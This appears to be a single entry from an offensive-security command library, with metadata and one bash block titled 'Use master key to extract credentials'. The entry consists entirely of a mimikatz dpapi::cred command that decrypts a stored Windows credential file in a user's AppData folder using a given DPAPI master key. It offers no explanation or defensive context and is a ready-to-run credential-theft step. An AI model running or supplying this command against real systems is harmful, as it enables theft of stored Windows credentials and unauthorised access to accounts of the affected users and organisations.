---
id: 3fa32fbf-33e3-4aa0-b81a-642b05392e69
name: Use master key to extract credentials
type: command
executor: bash
data: $ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
  /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
output: null
created_at: '2023-04-06T03:56:27.473645+00:00'
updated_at: '2023-04-10T20:37:18.798330+00:00'
---

# Use master key to extract credentials

```bash
$ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
```
